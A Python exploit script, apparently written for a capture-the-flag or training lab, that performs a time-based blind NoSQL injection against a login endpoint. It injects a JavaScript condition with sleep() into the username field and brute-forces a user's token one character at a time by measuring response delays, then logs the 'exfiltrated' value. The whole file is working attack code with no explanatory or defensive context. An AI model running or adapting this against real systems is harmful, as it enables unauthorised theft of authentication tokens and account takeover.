import requests
import re
import string
import logging
import time

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

special = '-'

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Define the URL and headers
url = 'http://94.237.63.109:33816/login'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-type': 'application/x-www-form-urlencoded',
}

def send_request(payload):
    try:
        start_time = time.time()
        response = requests.post(url, payload, headers=headers, proxies=proxies)
        end_time = time.time()
        response.raise_for_status()  # Raise an error for bad status codes
        response_time = end_time - start_time
        return response.text, response_time
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None, None

def test_attribute(test_value):
    payload =f'username=%22+%7C%7C+this.username.match%28%22bmdyy%22%29+%26%26+this.token.match%28%22%5E{test_value}.*%22%29+%26%26+sleep%285000%29+%7C%7C+%22%22%3D%3D%22&password=x'
    response_text, response_time = send_request(payload)
    if response_time is not None and response_time > 4:
        return True
    return False

def exfiltrate_attribute():
    found_string = ""
    iteration = 1
    characters = string.digits + string.ascii_uppercase + special  # Using only digits for brute-forcing
    while True:
        found = False
        logger.info(f"[*] Starting iteration {iteration}: Current found string: '{found_string}'")
        for char in characters:
            test_value = found_string + char
            logger.info(f"[*] Testing character: '{char}' -> Current test value: '{test_value}'")
            if test_attribute(test_value):
                found_string += char
                logger.info(f"[+] Found character '{char}': Exfiltrated value so far: '{found_string}'")
                found = True
                break
        if not found:
            logger.info(f"[!] No more characters found. Exfiltration complete.")
            logger.info(f"[+] Finished exfiltrating: {found_string}")
            break
        iteration += 1

    return found_string

if __name__ == "__main__":
    logger.info("[*] Starting attribute exfiltration process...")
    description_value = exfiltrate_attribute()
    logger.info(f"[+] Exfiltrated token: {description_value}")
